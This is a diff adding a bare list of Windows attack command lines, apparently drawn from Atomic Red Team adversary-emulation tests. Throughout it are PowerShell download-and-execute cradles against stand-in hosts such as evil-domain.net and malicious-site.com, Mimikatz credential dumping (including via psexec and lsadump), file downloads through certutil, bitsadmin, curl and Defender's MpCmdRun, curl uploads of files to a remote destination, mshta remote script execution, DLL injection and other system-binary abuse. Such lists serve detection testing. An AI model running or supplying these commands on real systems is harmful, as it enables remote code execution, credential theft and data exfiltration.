@@ -1,0 +1,59 @@
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','http://malicious-site.com/payload.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('http://malicious-site.com/payload.ps1');$Xml.command.a.execute | IEX"
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:http://malicious-site.com/payload.ps1').Exec();close()"
+powershell.exe -e  SQBFAFgA...
+$malcmdlets = #{Malicious_cmdlets}
+cmd /c certutil -urlcache -split -f http://evil-domain.net/file.exe C:\Users\Public\temp.exe
+C:\Windows\System32\bitsadmin.exe /transfer job1 /Priority HIGH http://evil-domain.net/file.exe C:\Users\Public\temp.exe
+(New-Object System.Net.WebClient).DownloadFile("http://evil-domain.net/file.exe", "C:\Users\Public\file.exe")
+CScript.exe AtomicTestT1105.js //E:JScript
+pushd C:\Users\Public\file.exe
+copy C:\Windows\System32\cmd.exe C:\svchost.exe
+C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
+cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
+MpCmdRun.exe -DownloadFile -url http://evil-domain.net/file.exe -path C:\Users\Public\temp.exe
+timeout --preserve-status 5 whois -h evil-domain.net -p 80 "example" > C:\Temp\out.txt
+(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File C:\Temp\out.txt; Invoke-Item C:\Temp\out.txt
+$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+curl.exe -k http://evil-domain.net/file.exe -o c:\users\public\music\allthethingsx64.dll
+curl.exe -k http://evil-domain.net/file.exe -o c:\programdata\allthethingsx64.dll
+curl.exe -k http://evil-domain.net/file.exe --output c:\users\public\music\allthethingsx64.dll
+curl.exe --upload-file C:\Users\Public\file.exe #{remote_destination}
+curl.exe --data C:\Users\Public\file.exe #{remote_destination}
+"C:\Temp\run.exe" 1>NUL
+echo $machine >> "$completed_list"
+{cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
+del %TEMP%\PrintBrm.zip >nul 2>&1
+#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
+del %TEMP%\redcanary.cab >nul 2>&1
+#{Path_replace} "#{replace_cab}" %TEMP% /A
+'certreq.exe -Post -config http://evil-domain.net/file.exe c:\windows\win.ini C:\Users\Public\temp.exe'
+wscript.exe "#{vbscript_file}"
+cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" http://evil-domain.net/file.exe C:\Users\Public\file.exe
+powershell.exe iwr -URI http://evil-domain.net/file.exe -Outfile C:\Users\Public\temp.exe
+GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
+nscurl -k "http://evil-domain.net/file.exe" -o "C:\Users\Public\file.exe"
+'sqlcmd -i #{remote_url} -o #{local_file_path}'
+$filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
+"#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
+$address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value
+$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','http://malicious-site.com/payload.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('http://malicious-site.com/payload.ps1');$Xml.command.a.execute | IEX"
+reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:http://malicious-site.com/payload.ps1').Exec();close()"
+mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
+C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
+InfDefaultInstall.exe "#{inf_to_execute}"
+#{mwcpath}\#{mwcname} "#{xml_payload}" output.txt
+wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
+%TEMP%\ie4uinit.exe -BaseSettings
+reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
+wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "#{payload_path}"
+pnputil.exe /add-driver "#{driver_inf}"
+pnputil.exe -i -a #{driver_path}
